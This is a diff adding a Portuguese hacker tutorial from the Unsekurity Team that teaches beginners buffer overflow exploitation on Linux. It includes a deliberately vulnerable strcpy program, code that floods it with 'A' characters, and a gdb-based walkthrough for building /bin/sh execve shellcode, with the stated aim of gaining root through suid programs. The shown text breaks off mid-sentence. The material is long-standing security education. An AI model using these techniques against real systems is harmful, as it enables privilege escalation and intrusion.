@@ -1,0 +1,3073 @@
+#############################################################################
+########################### UNSEKURITY TEAM #################################
+#############################################################################
+
+                               OVERFLOWS
+
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+Segmentation Fault!
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+Thanks Magic kiss e Unsekurity Team.
+Voce pode encontrar este e outros textos em:
+http://unsekurity.virtualave.net/
+
+
+AVISO:  NAO NOS RESPONSABILIZAMOS PELO MAU USO DAS INFORMACOES AQUI CONTIDAS,
+        ESSAS INFORMACOES TEM SOMENTE PROPOSITO EDUCACIONAL.NADA DE BOBAGENS!
+
+
+
+Sao varios os pre-requisitos p/ a leitura e o entendimento desse arquivo texto.
+Vamos partir do pre-suposto que voce sabe programar em C, conhece bem o sistema
+operacional linux, pois como muitos, esse txt estah voltado somente p/
+sistemas operacionais linux, digo sistemas, porque hj em dia ha muita
+diferenca entre Slack, Debian e REd sux. Faz necessario um conhecimento
+basico de assembly, existe um texto voltado justamente p/ a programacao de
+shellcodes na home page citada acima que poderah ajudar, mas eh bom ter em
+mente mais material sobre assembly.Mais uma vez, esse txt eh voltado p/
+"Newbies", se voce eh elite vah procurar outro material, as teorias aqui
+nao serao aproveitadas por voce,caso seja elite!!!Como nos demais txts que
+escrevi, vou tentar ser o mais pratico possivel, e nesse nao serah diferente.
+Se quiser se aprofundar mais no assunto, no fim desse txt colocarei alguns
+links onde vc poderah encontrar mais informacoes sobre esse tao fascinante
+assunto.Eu iria me aprofundar ao maximo, mas o velho inimigo conhecido
+como tempo tem me vencido em muitas batalhas, de modo que pretendo
+nesse txt ficar no basico do basico, mas jah tem material futuro sendo
+preparado.Espere e verah!
+
+Bem,depois de toda essa ladainha,vamos trabalhar.
+
+------------------------------- INDICE -----------------------------------
+
+1.INTRODUCAO
+  1.1  O que eh um buffer overflow
+  1.2  Tirando proveito
+  1.3  Modelo usual de memoria
+2.O STACK OU A PILHA
+3.SHELLCODE
+  3.1 Shellcode /bin/sh
+4.FAZENDO UM STACK OVERFLOW
+5.PROBLEMAS COM EXPLOITS
+6.O HEAP - A NOVA ERA??
+  6.1 Alocacao dinamica em C
+7.HEAP OVERFLOW
+8.O PROJETO OMEGA
+9.PROCURANDO FUROS
+10.TERMINANDO
+   10.1 Links e Referencias
+   10.2 Consideracoes Finais
+---------------------------------------------------------------------------
+
+
+
+----------------
+1. - INTRODUCAO |
+----------------
+
+Buffer overflows nao eh coisa nova.Comenta-se que desde a decada de 70 jah
+se tinha ideia do potencial desse problema, os programas em C estavam se
+firmando, e a medida que o tempo passava, os programadores iam crescendo
+em numero,mas diminuindo em cuidados.No entanto, a popularizacao dessa tecnica
+soh se efetivou com a chegada do "poderoso worm" de Robert Morris, comecava
+uma nova geracao de problemas p/ os administradores de redes, essa
+popularizao dessa tecnica foi muito gradual, poucos eram os documentos
+disponiveis,fazendo com que a "elite" mantivesse o controle total dela, mas
+como nem tudo dura p/ sempre, em 1994, surgem reforcos no intuito de
+massificar os conhecimentos nessa area, isso culmina com os excelentes textos
+feito pela PHRACK e pelo pessoal da The Hacker's Choice.A realidade disso
+tudo, eh que ainda hoje ocorrem muitos erros de programacao,surgem novas
+ferramentas que se dizem "capazes" de nao permitir mais um stack overflow,
+bem como novos programas que procuram bugs, e ateh mesmo fazedores de
+shellcodes.Voce deve estar se perguntando, se tem tudo isso,estou perdendo
+meu tempo lendo isso aqui??Assim como muitos,eu era um grande dependente
+de fucadores de fora, ficava agindo igual a um kiddie, ateh que num belo
+dia, surgiu um bug fantastico que estava sendo explorado por pouca gente,
+mas como eu era dependente e ninguem era louco p/ publicar o programa que
+explorava esse bug,eu percebi que se eu dependesse dos outros,jamais poderia
+de fato ter acesso a sistemas grandes,bem como poder um dia ser chamado de
+fucador.O que eu disse eh o rumo natural das coisas, se chegou ateh aqui,
+deve ser porque quer caminhar mais longe,fazer seus proprios exploits,e
+descobrir bugs por conta propria, espero que esse txt seja util p/ alguem,
+quem dera eu tivesse um desse quando comecei a pesquisar sobre isso!!
+
+---------------------------------------------------------------------------
+
+--------------------------------
+1.1 O QUE EH UM BUFFER OVERFLOW |
+--------------------------------
+
+Os programas que manipulam(recebem) variaveis necessitam de buffers, que sao
+locais na memoria onde sao guardados os dados que as variaveis recebem, no
+nosso caso.Quando se declara num programa uma variavel com tamanho X, e na
+execucao desse programa essa variavel termina recebendo dados maiores que X,
+entao ocorre o que chamamos de "BUFFER OVERFLOW".Quando isso ocorre,na
+maioria da vezes, voce receberah uma "Segmentation Fault", isso poderah servir
+como pista, pois muitas vezes quando isso ocorre, o programa executado
+poderah ser vulneravel a um buffer overflow.Um exemplo pratico de uma
+vulnerabilidade deste tipo eh mostrado abaixo:
+
+/* PROGRAMA BUGADO - EXEMPLO PRATICO P/ TXT SOBRE OVERFLOWS
+Compile com $gcc -o bug1 bug1.c */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[]){
+char buffer[512];
+if(argc < 2){
+printf("Programa bugado!!\n");
+printf("Uso: %s <string>\n",argv[0]);
+exit(0);
+}
+strcpy(buffer,argv[1]);
+printf("Voce digitou %s!!\n",buffer);
+return 0;
+}
+
+Este eh o exemplo mais classico que existe.A funcao strcpy() copia o que voce
+digitar na linha de comando(argv[1]) p/ o buffer declarado (buffer) e como
+esta funcao nao faz checagem de tamanho, entao bomba!!
+Esse programa eh vulneravel a um buffer overflow.
+Teste ele digitando mais de 512 bytes em argv[1].Uma forma pratica seria:
+
+[localhost: /]$./bug1 `perl -e 'printf "A" x 530'`
+
+Se nao possui perl instalado tente na mao mesmo:
+
+[localhost: /]$./bug1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+
+Um monte de As.
+
+Ou se preferir, use o programa abaixo:
+
+---------------------------------------------------------------------
+
+/* Simples programa para ver se determinado
+   programa eh vulneravel a um buffer overflow.
+   Desenvolvido por Nash Leon e Unsekurity Team.
+   Thansk Ramona.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+/* Altere o PATH conforme o local que se encontra o arquivo bugado, bem
+   como  o tamanho que iremos usar p/ sobrescrever o buffer */
+
+#define   PATH      "/tmp/bug1"
+#define    A         0x41
+#define   TAMANHO    600
+
+main(int argc, char *argv[])
+{
+int i;
+char *buffer = (char *)malloc(TAMANHO);
+
+memset(buffer, A, TAMANHO-1);
+printf("Enchendo o buffer com caracter A !\n");
+execl(PATH,"bug1",buffer,0);
+}
+----------------------------------------------------------------------
+
+Isso eh soh um programa exemplo, voce pode alterar ele e fazer dele
+um checador de todo e qualquer programa que utilize a linha de comando
+para pegar argumentos para uma variavel.Fica aih a concepcao, talvez
+divulgue em breve algo melhor que possuo em maos.
+
+Verifique a resposta que surgirah 'Segmentation fault'.Isso serah bastante
+comum durante nosso estudo.
+
+Vamos analisar varios codigos usando a ferramente gdb (Debugador GNU).
+Se voce nao tiver,ele eh um software gnu(super gratuito!!!) voce poderah
+acha-lo em qualquer mirror de softwares ou distribuicoes linux que se preze.
+www.gnu.org ; ftp://ftp.cdrom.com/pub/gnu.Veremos agora como tirar
+proveito disso tudo.
+
+
+
+-----------------------
+1.2 - TIRANDO PROVEITO |
+-----------------------
+
+Sabemos entao quando ocorre um buffer overflow,quando colocamos mais dados
+que o programa pode suportar.Mas qual o intuito disso tudo?
+Um programa quando executado possui algumas particularidades, dentre elas
+destaca-se um artificio usado na computacao p/ que apos o termino da
+execucao desse programa, o sistema retome ao estado que se encontrava
+antes, o nome dado a este artificio eh "retorno".Mas para que isso possa
+acontecer, faz-se necessario alguns procedimentos: Primeiro, salva-se o
+endereco na memoria referente ao retorno(endereco de retorno) no stack, se
+a execucao normal do programa termina, o CPU irah saltar(jmp) para o
+endereco de retorno(return address) e continuar normalmente.Mas se
+alterarmos a execucao normal do programa usando um buffer overflow a
+coisa muda,se escrevermos mais dados em uma variavel e esse enchimento
+alcancar e sobrescrever a regiao da memoria onde estah o codigo de retorno
+entao ocorre o chamado "overflow".Fazendo isso poderemos mudar o curso
+de um programa, inserindo codigos nossos capazes de executar comandos
+como o dono do programa(nosso alvo serao as suid root, programas do
+superusuario), entao alterando o endereco de retorno, poderemos fazer
+com que nosso codigo que estah seguindo num argumento de uma funcao p/
+encher um buffer possa ser executado.
+Mais abaixo seguirao melhores explicacoes de como se fazer isso.
+
+
+------------------------------
+1.3 - MODELO USUAL DE MEMORIA |
+------------------------------
+
+O modelo usual de memoria difere de sistema para sistema.Em Linux/i186
+ela possui modelo flat de 32 bit.Um programa pode ser dividido em
+secoes.As secoes sao .text para seu codigo, .data para seus dados, .bss
+para dados indefinidos.Os programas devem ter no minimo a secao .text.
+Um esquema para visualizacao disso seria:
+
+                        -------------------
+                       |       .DATA       |
+                       | (Stack e Heap)    |
+                        -------------------
+                       |       .BSS        |
+                       |      (Heap)       |
+                        -------------------
+                       |       .TEXT       |
+                        -------------------
+
+
+Como vimos acima, eu coloquei as respectivas regioes onde ocorrem overflows
+relacionados.Stack overflows ocorrem na regiao .data, heap tambem pode
+ser usado p/ sobrescrever essa regiao (.data), mas eh usualmente mais
+usado p/ sobrescrever a regiao .bss.
+Se voce leu o texto sobre programacao de shellcodes na page do Unsekurity
+Team verah que nao eh mera coincidencia..:)
+As regioes onde ocorrem os overflows serao estudadas com mais detalhes
+mais a frente.Quanto a regiao .TEXT, como dito acima, ela eh a reponsavel
+por conter segmentos de codigos,os dados nesse segmento sao instrucoes
+em assembly que o processador executa.Veremos embaixo um outro modelo
+usual, soh que para uso de memoria em C.
+
+        Alta
+                 ---------------
+                |     Stack     |
+                 ---------------
+                |               |
+                | Memoria Livre |
+                | para alocacao |
+                |    (heap)     |
+                |               |
+                 ---------------
+                | Var. globais  |
+                 ---------------
+                |               |
+                |   Programa    |
+                |               |
+                 ---------------
+        Baixa
+
+
+Essa eh uma visao conceitual do uso de memoria no C, o que temos que
+ter em mente, e o que mais nos importa no momento, eh diferenciar as
+regioes onde ocorrem os dois tipos de overflows que serao descritos
+aqui, a regiao Stack e a regiao Bss onde podemos fazer heap overflows.
+Lembrando tambem que isso tudo aih eh imaginario, nao vah pensando que
+eh um quadradinho perfeitinho que vai sendo enchido nao!!
+
+------------------------------------------------------------------
+
+---------------------
+2. O STACK OU A PILHA|
+---------------------
+
+A regiao conhecida como STACK ou pilha, eh responsavel por receber
+dados(argumentos) e passa-los p/ as funcoes.Essa regiao possui tamanho
+relativo(muda quase sempre).O nome que se dah a essa regiao(STACK) eh
+porque ela pode ser comparada a uma pilha, onde voce vai enchendo ela
+de dados, soh que ela possui uma particularidade.Essa particularidade
+consiste em: O ultimo dado a entrar serah o primeiro a sair, chamamos
+isso de LIFO - last in, first out (ultimo a entrar,primeiro a sair).
+Na medida em que eh usado, o Stack ou a pilha,chamarei de Stack, cresce
+p/ baixo, sendo assim, a quantidade de memoria necessaria eh determinada
+da maneira como o programa foi projetado.Por exemplo, um programa com
+muitas funcoes recursivas utiliza mais memoria  no Stack do que um
+programa sem funcoes recursivas, justamente porque variaveis locais
+sao armazenadas no Stack.A parte necessaria para o programa e as
+variaveis globais(citadas no esquema de memoria acima), eh determinada
+durante a execucao do programa.
+Uma pilha(Stack) eh o contrario de uma fila,porque usa o acesso "ultimo
+a entrar, primeiro a sair", denominado LIFO.Para visualizar um Stack,
+basta imaginar uma pilha de pratos.O prato da base do Stack eh o ultimo
+a ser usado e o prato do topo, o primeiro.Stacks sao geralmente utilizados
+em softwares basicos, incluindo compiladores e interpretadores.Geralmente
+o C usa o Stack quando passa parametros(argumentos) as funcoes.Dois
+comandos em assembly sao usado para enviar e retirar dados do Stack,
+sao eles push e pop, respectivamente.
+
+Veremos abaixo o esquema de um Stack em acao:
+
+         Acao                   Conteudo do Stack
+        ------                ---------------------
+
+       push(A)                          A
+       push(B)                          A  B
+       push(C)                          A  B  C
+       pop()  /* retira o ultimo */     A  B
+       push(N)                          A  B  N
+       pop()                            A  B
+       pop()                            A
+       pop()                            /* vazio */
+
+
+
+Vemos acima o esquema da LIFO - ultimo a entrar,primeiro a sair.
+Isso eh mais do que o suficiente, espero que tenha ficado claro as coisas
+para voce,amigo!!Vamos esquentar mais as coisas.
+
+        
+-------------
+3. SHELLCODE |
+-------------
+
+Eu fiz um txt sobre escrita de shellcodes e voce pode encontrar ele na
+home page citada acima.Ele eh bem completo e ensina ateh um basico
+sobre assembly, entao amigo, se quiser obter mais dados sobre isso, olhe
+na home page "http://unsekurity.virtualave.net/", procure esse texto
+porque lah possui mais informacoes basicas e detalhadas sobre a escrita
+de shellcodes. Mas nesse daqui darei uma breve explicacao sobre eles e
+o porque de se usa-los.
+No exemplo inicial, o do capitulo 1.1, vimos como encher um buffer com As,
+mas isso nao eh proveitoso,o que se poderia fazer com isso eh tao somente
+conseguir um DoS(Denial of Service) em servicos remotos p/ intuitos nada
+simples.Tambem vimos no capitulo 1.2 que podemos sobrescrever o endereco
+de retorno(return address).Se podemos fazer isso tudo entao devemos
+raciocinar, ao invez de tacar um monte de As, por que nao colocarmos
+codigos de maquina para executar alguma coisa, jah que podemos
+sobrescrever o endereco de retorno p/ apontar para algum lugar na memoria
+aonde estah inserido nosso codigo?? Exato!!Isso nao soh eh possivel como
+eh um fato!!Nao tenho conhecimento do cara que descobriu isso,mas deve-se
+muito a ele!
+Sobrescrevendo o endereco de retorno fazendo-o apontar p/ o inicio
+de um codigo nosso, podemos executar o codigo como se fossemos o dono
+do programa bugado!!Geralmente se procura bugs em programas com suid root
+ou mesmo em sgid, que nos dao boas permissoes.Digo isso porque em breve
+descreverei alguns esquemas para banco de dados tambem, coisas um pouco
+diferentes, fique ligado!:)
+Bem como dito, o codigo que geralmente usamos, eh chamado de shellcode,
+pois executamos ele como se fosse uma linha de comando.Descreverei
+aqui alguns shellcodes,mas nesse texto especifico sobre shellcodes dito
+acima, encontram-se mais exemplos.
+Na maioria das vezes, em exploits locais, tudo que queremos eh executar
+o comando "/bin/sh" ou "/bin/bash" como se fosse root.Abaixo segue um
+esquema de shellcode para um desses citado:
+
+3.1 - SHELLCODE /BIN/SH
+------------------------
+
+Esse existe por aih e eh amplamente difundido,tentarei ser bem pratico
+ao descrever como se criar um shellcode deste tipo,lembrando, nesse txt
+nao ensinarei nada sobre assembly, se quiser aprender algo,leia o outro.
+Vamos lah,veremos agora o codigo em C responsavel pela execucao desse
+dito cujo:
+
+/* Comecando a criar um shellcode */
+
+#include <stdio.h>
+main(){
+char *comando[2];
+comando[0]="/bin/sh";
+comando[1]=NULL;
+execve(comando[0],comando,NULL);
+}
+
+Compilamos esse programa da seguinte forma usando gcc:
+[localhost:/]$gcc -o shell -static -ggdb shell.c
+
+Apos compilarmos o mesmo, usamos o gdb para analisar seu codigo em asm:
+
+[localhost:/]$ gdb shell
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions. Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+Em seguida digitamos "disassemble main", para que o gdb nos forneca o
+codigo da funcao main em linguagem assembly.Veremos:
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     sub    $0x8,%esp
+0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
+0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+0x8048164 <main+20>:    push   $0x0
+0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax
+0x8048169 <main+25>:    push   %eax
+0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax
+0x804816d <main+29>:    push   %eax
+0x804816e <main+30>:    call   0x80483fc <execve>
+0x8048173 <main+35>:    add    $0xc,%esp
+0x8048176 <main+38>:    mov    %ebp,%esp
+0x8048178 <main+40>:    pop    %ebp
+0x8048179 <main+41>:    ret
+End of assembler dump.
+(gdb)
+
+Vamos analisar com calma cada linha disso daih.
+
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     sub    $0x8,%esp
+
+Essa tres primeiras linhas correspondem ao processo inicial ou
+procedimento preludio.O que essas linhas fazem, primeiro eh salvar o
+frame pointer antigo, em seguida faz do atual stack pointer o novo frame
+pointer(mov %esp,%ebp), logo apos autoriza espaco para as variaveis
+locais, onde no nosso caso eh:
+char *comando[2];
+
+Lembrando que ponteiro eh uma word long, entao ele autoriza espaco para
+duas words ou 8 bytes como vimos(sub $0x8,%esp).Continuando:
+
+0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
+
+Essa gigantesta linha aih nao tem nada de complexo como parece,o que
+estah sendo feito aih eh a copia do endereco da string "/bin/sh"(valor
+0x8058b28) sobre o primeiro ponteiro de comando[] (0xfffffff8(%ebp)).
+Isto equivale a: comando[0] = "/bin/sh". Continuando:
+
+0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+
+O que foi feito agora eh a copia do valor 0x0, que eh equivalente a NULL,
+sobre o segundo ponteiro de comando[].Isto eh equivalente a:
+comando[1] = NULL; em nosso codigo shell.c acima.Continuando:
+
+0x8048164 <main+20>:    push   $0x0
+
+Bem amigos, aqui tem inicio a chamada da funcao execve(), lembrando,
+o programa empurra os argumentos de execve em ordem inversa(do ultimo
+argumento para o primeiro) sobre o stack.Acima vimos que comeca com
+0x0 (NULL).Em nosso fonte shell.c temos: execve(comando[0],comando,NULL);
+Eh a este NULL que estamos nos referindo.Continuando:
+
+0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax
+
+Aqui ocorre o carregamento do endereco de comando[] sobre o registrador
+EAX.Continuando:
+
+0x8048169 <main+25>:    push   %eax
+
+Esse nao possui segredo, o que ocorreu foi que empurramos o endereco
+de comando[] que havia sido previamente carregado no registrado EAX
+sobre o Stack. Continuando:
+
+0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax
+
+Aqui, carregamos o endereco da string "/bin/sh" sobre o registrador
+EAX.Continuando:
+
+0x804816d <main+29>:    push   %eax
+
+Novamente a funcao push(), que nos diz dessa vez que estamos empurrando
+os dados do registrado EAX, que nesse caso eh o endereco da string
+"/bin/sh", sobre o Stack.Continuando:
+
+0x804816e <main+30>:    call   0x80483fc <execve>
+
+Aqui acontece o seguinte, ocorre a chamada a biblioteca de procedimentos
+execve(), ou simplesmente a chamada propriamente dita da funcao execve().
+A instrucao chamada empurra o IP(Index Pointer) sobre o Stack.
+Lembrando que apos a execucao de execve(), nosso programa termina, entao
+as linhas abaixo seguem para voltar as rotinas anteriores:
+
+0x8048173 <main+35>:    add    $0xc,%esp
+0x8048176 <main+38>:    mov    %ebp,%esp
+0x8048178 <main+40>:    pop    %ebp
+0x8048179 <main+41>:    ret
+
+Ocorre aih em cima o seguinte, eh o processo de saida, retorna o velho
+frame pointer, faz dele o stual stack pointer em seguida esvazia a pilha
+com pop. e ret retorna p/ o sistema.
+
+Agora analisaremos a funcao execve();
+
+(gdb) disassemble execve
+Dump of assembler code for function execve:
+0x80483fc <execve>:     push   %ebp
+0x80483fd <execve+1>:   mov    %esp,%ebp
+0x80483ff <execve+3>:   push   %ebx
+0x8048400 <execve+4>:   mov    $0xb,%eax
+0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
+0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
+0x804840b <execve+15>:  mov    0x10(%ebp),%edx
+0x804840e <execve+18>:  int    $0x80
+0x8048410 <execve+20>:  mov    %eax,%edx
+0x8048412 <execve+22>:  test   %edx,%edx
+0x8048414 <execve+24>:  jge    0x8048426 <execve+42>
+0x8048416 <execve+26>:  neg    %edx
+0x8048418 <execve+28>:  push   %edx
+0x8048419 <execve+29>:  call   0x8050b28 <__normal_errno_location>
+0x804841e <execve+34>:  pop    %edx
+0x804841f <execve+35>:  mov    %edx,(%eax)
+0x8048421 <execve+37>:  mov    $0xffffffff,%eax
+0x8048426 <execve+42>:  pop    %ebx
+0x8048427 <execve+43>:  mov    %ebp,%esp
+0x8048429 <execve+45>:  pop    %ebp
+0x804842a <execve+46>:  ret
+0x804842b <execve+47>:  nop
+End of assembler dump.
+
+O codigo parece complicado a primeira vista,muitas instrucoes em assmebly,
+nao tao conhecidas p/ um newbie, como neg,test,jne, mas que sao explicadas
+em diversos tutoriais internet a fora, inclusive no meu outro sobre
+escrita de shellcodes..:)..Vendido meu peixe, vamos prosseguir.A maioria
+das coisas voce jah pode saber somente olhando e comparando com as
+explicacoes passadas.Mas vejamos:
+
+0x80483fc <execve>:     push   %ebp
+0x80483fd <execve+1>:   mov    %esp,%ebp
+0x80483ff <execve+3>:   push   %ebx
+
+Isso eh o mesmo procedimento inicial descrito na explicacao sobre a
+funcao main().Pega-se o velho frame pointer e salva-o, em seguida faz do
+atual stack pointer o novo frame pointer e depois o empurra no stack.
+Continuando:
+
+0x8048400 <execve+4>:   mov    $0xb,%eax
+
+Copia 0xb sobre EAX, que eh o numero 11 em decimal.Este numero corresponde
+ao system call execve() na tabela de system calls do sistema.Voce pode
+conferir essa tabela em /usr/include/sys/syscall.h , nao sei se isso
+varia de linux para linux,mas creio que nao.Continuando:
+
+0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
+
+O que aconteceu acima foi a copia do endereco de "/bin/sh" sobre EBX.
+Continuando:
+
+0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
+
+Copiamos o endereco de comando[] sobre ECX.
+
+0x804840b <execve+15>:  mov    0x10(%ebp),%edx
+
+Copiamos o endereco do ponteiro nulo (NULL) sobre EDX.
+
+0x804840e <execve+18>:  int    $0x80
+
+Aqui nos mudamos para o modo kernel.
+
+Para o intuito da escrita de shellcodes, isso aqui eh o fim do estudo
+da funcao execve(), esses comandos que seguem abaixo, jah sao mais
+complexos e acredite, creio serem inuteis para os nossos objetivos!!Uma
+vez que se entra no modo kernel, as intrucoes que seguem "nao fazem"
+parte do nosso programa.Se quiser ver como a coisa vai se complicando
+digite na linha de comandos do gdb "disassemble __normal_errno_location"
+e por aih vai.
+
+O estudo detalhado acima nos dah uma boa base para sabermos como
+funciona o processo de execucao de nosso programa shell.c em instrucoes
+de "maquina".
+
+Veremos abaixo alguns passos que nos ajudarao a escrever nosso shellcode.
+Necessitaremos das seguintes coisas p/ podermos escrever nosso shellcode:
+
+1. Termos a string "/bin/sh" terminada nula em algum lugar na memoria.
+   Lembrando que estamos querendo executar esse comando, se fosse outro,
+   logico que poderiamos mudar isso.
+
+2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
+   por uma word null long.Por que isso? lembra do esquema:
+   comando[1] = NULL;
+   Se faz necessario isso aqui.
+
+3. Copiar 0xb sobre o registrador EAX.
+   Lembrando que de acordo com a tabela de system calls que podemos achar
+   em /usr/include/sys/syscall.h, o numero decimal correspondente ao
+   syscall execve() eh 11 (0xb).
+
+4. Copiar o endereco da string "/bin/sh" sobre o registrador EBX.
+
+5. Copiar o endereco da string "/bin/sh" sobre o registrador ECX.
+
+6. Copiar o endereco da word null long sobre o registrador EDX.
+
+7. Executar a intrucao int $0x80.
+
+Para facilitar o aprendizado veremos como cada um dos passos citados
+acima, no nosso exemplo inicial de shellcode:
+
+1. 0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
+
+2. 0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+
+3. 0x8048400 <execve+4>:   mov    $0xb,%eax
+
+4. 0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
+
+5. 0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
+
+6. 0x804840b <execve+15>:  mov    0x10(%ebp),%edx
+
+7. 0x804840e <execve+18>:  int    $0x80
+
+O esquema acima eh apenas demonstrativo, ainda faltam alguns passos p/
+seguir na construcao de um shellcode eficiente.Por exemplo,para evitar
+que o programa continue buscando instrucoes para o Stack, caso a funcao
+execve() falhe.Nos precisaremos usar um artificio que faca com que o
+programa saia limpamente, caso haja falha em execve().Sair limpamente
+significa voltar a linha de comando, sem que o programa busque dados
+aleatorios caso execve() falhe.Para fazermos isso basta inserir uma
+chamada normal de saida junto ao nosso shellcode.Fazemos isso da seguinte
+forma:
+
+Pegamos e compilamos o programa abaixo:
+
+------------------------------------------------------------------------
+/* PROGRAMA QUE NOS AJUDARAH A SAIR LIMPAMENTE
+   CASO EXECVE() FALHE
+   Compile com: gcc -o saida -static -ggdb saida.c
+*/
+
+#include <stdio.h>
+
+void main(){
+exit(0);
+}
+-----------------------------------------------------------------------
+
+Compilamos ele entao:
+[localhost:/]$ gcc -o saida -static -ggdb saida.c
+
+Logo apos a compilacao,chamamos nosso bom e velho debugador gdb para
+vermos como isso fica em asm:
+
+[localhost:/]$gdb saida
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+Em seguida digitamos "disassemble _exit" para que o gdb nos forneca o que
+queremos saber.Atencao: digite _exit(com um traco antes, como estah aqui).
+
+(gdb) disassemble _exit
+Dump of assembler code for function _exit:
+0x80483e4 <_exit>:      push   %ebp
+0x80483e5 <_exit+1>:    mov    %esp,%ebp
+0x80483e7 <_exit+3>:    push   %ebx
+0x80483e8 <_exit+4>:    mov    $0x1,%eax
+0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
+0x80483f0 <_exit+12>:   int    $0x80
+0x80483f2 <_exit+14>:   mov    0xfffffffc(%ebp),%ebx
+0x80483f5 <_exit+17>:   mov    %ebp,%esp
+0x80483f7 <_exit+19>:   pop    %ebp
+0x80483f8 <_exit+20>:   ret
+0x80483f9 <_exit+21>:   nop
+0x80483fa <_exit+22>:   nop
+0x80483fb <_exit+23>:   nop
+End of assembler dump.
+
+Podemos facilmente ver algumas coisas, vamos analisar este codigo.
+
+0x80483e4 <_exit>:      push   %ebp
+0x80483e5 <_exit+1>:    mov    %esp,%ebp
+0x80483e7 <_exit+3>:    push   %ebx
+
+Procedimento inicial, o mesmo esquema descrito para a funcao execve()
+acima.Continuando:
+
+0x80483e8 <_exit+4>:    mov    $0x1,%eax
+
+Aqui ele coloca 0x1 (1 em decimal) no registrado EAX.Esse eh o numero
+correspondente ao system call exit() na tabela de system calls.
+Continuando:
+
+0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
+
+Aqui copia o endereco de exit, propriamente dito.Por que isso?? Veremos
+porque logo abaixo.quando virmos algumas linhas de main().
+
+0x80483f0 <_exit+12>:   int    $0x80
+
+Muda para o modo kernel.
+
+Disassemblando main, teremos:
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     push   $0x0
+0x8048155 <main+5>:     call   0x804829c <exit>
+0x804815a <main+10>:    add    $0x4,%esp
+0x804815d <main+13>:    lea    0x0(%esi),%esi
+0x8048160 <main+16>:    mov    %ebp,%esp
+0x8048162 <main+18>:    pop    %ebp
+0x8048163 <main+19>:    ret
+End of assembler dump.
+
+O que nos interessa para entendermos a linha <_exit+9> do codigo asm
+de exit() eh somente o seguinte:
+
+0x8048153 <main+3>:     push   $0x0
+0x8048155 <main+5>:     call   0x804829c <exit>
+
+Como o Stack pega os argumento de tras para frente, na linha do nosso
+programa saida.c: exit(0), em asm teremos:
+push $0x0  -> Empurra 0 sobre o Stack.
+call exit  -> Chama a funcao exit().
+
+Isso tudo fica armazenado em:
+0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
+
+Eis aih o porque.
+Quanto a usarmos 0 em exit(), eh somente porque a maioria dos programas
+retornam 0 na saida para indicar que nao possui erros.Se tiver acesso
+ao codigo fonte dos programas, verifique, porque isso pode muito bem
+mudar.
+
+Como necessitamos inserir uma saida limpa(caso execve() falhe), descrita
+no exemplo acima, nossos passos em busca de um shellcode eficiente mudam.
+Teremos entao agora:
+
+1. Ter a string "/bin/sh" terminada nula em algum lugar na memoria.
+
+2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
+por uma word null long.
+
+3. Copiar 0xb sobre o registrado EAX.
+
+4. Copiar o endereco do endereco da string "/bin/sh" sobre o registrado
+   EBX.
+
+5. Copiar o endereco da string "/bin/sh" sobre o registrado ECX.
+
+6. Copiar o endereco da null word long sobre o registrador EDX.
+
+7. Executar a instrucao int $0x80.
+
+* Aqui comecao exit().
+
+8. Copiar 0x1 sobre registrado EAX.
+
+9. Copiar 0x0 sobre o registrador EBX.
+
+10.Executar a instrucao $0x80.
+
+Como podemos ver, para a funcao exit() nao temos muita coisa,senao tres
+linhas apenas, expliquei tudo aquilo acima porque quero que voce entenda
+como a coisa funciona.Nao vejo como saber que necessitamos do passo 9, sem
